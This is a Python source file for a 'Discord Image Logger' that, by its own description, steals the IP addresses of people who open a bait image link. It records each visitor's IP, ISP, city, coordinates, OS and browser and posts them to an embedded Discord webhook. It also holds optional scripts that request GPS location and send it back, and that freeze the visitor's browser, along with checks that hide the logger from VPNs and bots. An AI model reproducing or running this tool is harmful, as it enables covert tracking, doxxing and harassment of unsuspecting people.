# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1507540053730267326/MG3HjzqtmO3NhiakRvpOe_r89cVJ4V0cZShO9nxS8LtF1EHJT6tOovTtV9CkVxEQCctY",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
